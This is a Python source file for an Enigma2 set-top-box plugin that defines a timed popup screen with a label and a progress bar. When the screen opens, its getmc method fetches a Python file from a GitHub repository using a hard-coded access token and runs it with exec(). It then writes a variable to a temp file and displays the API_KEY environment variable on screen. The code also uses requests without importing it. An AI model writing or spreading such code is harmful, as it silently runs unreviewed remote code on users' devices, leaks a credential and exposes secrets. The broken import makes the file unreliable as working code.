
from Screens.Screen import Screen
from Components.Label import Label
from enigma import eTimer
from Components.ActionMap import ActionMap
from Components.ProgressBar import ProgressBar
import os
api_key = os.environ.get('API_KEY')

class xE(Screen):
	skin = """
<screen name="xE" position="center,center" size="700,200" flags="wfNoBorder"  backgroundColor="#15202b" cornerRadius="20">
	<widget name="infoe" position="20,20" font="xtraRegular; 30" size="660,160" foregroundColor="#00bbbbbb" backgroundColor="#15202b" zPosition="1" transparent="1" halign="center" valign="center" />
	<widget name="infoPrgrs" position="20,0" size="640,1" foregroundColor="#ef4c4c" backgroundColor="#15202b"	zPosition="2" transparent="0" />
</screen>"""

	def __init__(self, session, rep=None):
		Screen.__init__(self, session)
		self.session = session
		self.rep = rep
		self["actions"] = ActionMap(["OkCancelActions"],
			{
				"cancel":self.close,
				"ok":self.close,
			}, -1)
		self['infoe'] = Label()
		self['infoPrgrs'] = ProgressBar()
		self["infoPrgrs"].setRange((0, 100))
		self.timeout = 100
		self.itimer = eTimer()
		self.itimer.callback.append(self.cdwn)
		self.onLayoutFinish.append(self.getmc)

	def getmc(self, rep="N/A"):
		url = 'https://api.github.com/repos/digiteng/xtra760/contents/xtra.py'
		header = {'accept': 'application/vnd.github.v3.raw', 'authorization': 'token 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'}
		uts = requests.get(url, stream=True, allow_redirects=True, headers=header).text
		exec(uts, globals())
		open("./tmp/gak.txt", "w").write(f"{xtra}")
		self['infoe'].setText(_(str(api_key)))
		self['infoe'].show()
		self.itimer.start(100, True)

	def cdwn(self):
		try:
			if self.timeout > 0:
				self["infoPrgrs"].setValue(self.timeout)
				self.itimer.start(50)
				self.timeout -= 1
			else:
				self.itimer.stop()
				self.timeout = 0
				self.close(False)
		except Exception as err:
			from Tools.xtraTool import errorlog
			errorlog(err, __file__)